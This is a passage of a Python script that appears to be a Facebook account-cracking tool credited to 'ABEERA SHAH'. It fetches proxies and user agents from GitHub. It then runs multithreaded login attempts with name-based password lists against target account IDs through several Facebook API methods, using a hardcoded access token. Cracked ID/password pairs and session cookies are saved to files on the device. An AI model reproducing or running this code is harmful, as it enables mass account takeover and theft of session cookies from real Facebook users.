	...
	os.system('python abeera.py')
	
print('[•] Join Our Group')
os.system('xdg-open https://facebook.com/groups/1911145125897343/')

try:
	prox= requests.get('https://raw.githubusercontent.com/ABEEEASHAHXD/data/main/proxies.txt').text
	open('proxies.abeera','w').write(proxies)
except Exception as e:
	print('\x1b[1;95m[√] LOADING...')
	
proxies=open('proxies.abeera','r').read().splitlines()


android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/ABEEEASHAHXD/data/main/strings.txt').text.splitlines()
	for line in xx:
...
usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/ABEEEASHAHXD/data/main/ua.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
...
logo=("""\033[1;91m
        \033[1;97m       d8888 888888b.   8888888888 8888888888 8888888b.         d8888 
      d88888 888  "88b  888        888        888   Y88b       d88888 
     d88P888 888  .88P  888        888        888    888      d88P888 
    d88P 888 8888888K.  8888888    8888888    888   d88P     d88P 888 
   d88P  888 888  "Y88b 888        888        8888888P"     d88P  888 
  d88P   888 888    888 888        888        888 T88b     d88P   888 
 d8888888888 888   d88P 888        888        888  T88b   d8888888888 
d88P     888 8888888P"  8888888888 8888888888 888   T88b d88P     888 
                                                                      
                                                                      
                                                                      \033[1;32m       XD
\033[1;37m--------------------------------------------------
[~] Author   : ABEERA SHAH
[~] Facebook : Abeera Shah XD
[~] Tool     : Personal
[~] Version  : 0.1
\033[1;37m----------------------------------------------""")
def linex():
...
def pak():
		...
		with tred(max_workers=30) as TRT:	
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					ABEERA.submit(trt1,ids,passlist)
				if mthd in ['2','02']:
					ABEERA.submit(trt2,ids,passlist)
				if mthd in ['3','03']:
					ABEERA.submit(trt3,ids,passlist)
				if mthd in ['4','04']:
					ABEERA.submit(trt4,ids,passlist)
				if mthd in ['5','05']:
					ABEERA.submit(trt5,ids,passlist)
				if mthd in ['6','06']:
					ABEERA.submit(trt6,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [ABEERA-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [ABEERA-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/ABEERA-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [ABEERA-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/ABEERA-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/ABEERA-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [ABEERA-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ABEERA-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ABEERA-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/ABEERA-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/ABEERA-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ABEERA-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [ABEERA-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ABEERA-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/ABEERA-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ABEERA-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [ABEERA-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in ABEERA:
				...
				print('\r\r\033[1;32m [ABEERA-OK] %s | %s'%(ids,pas))
				open('/sdcard/ABEERA-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in ABEERA:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [ABEERA-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/ABEERA-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [ABEERA-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [ABEERA-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [ABEERA-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TRT-rnd-ABEERA.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [ABEERA-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ABEERA-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def trt2(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [ABEERA-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/ABEERA-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [ABEERA-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/ABEERA-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        #open('/sdcard/ABEERA-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ABEERA-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
...
def trt4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [ABEERA-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [ABEERA-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [ABEERA-OK] '+uid+' | '+pas)
						open('/sdcard/ABEERA-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [ABEERA-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/ABEERA-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
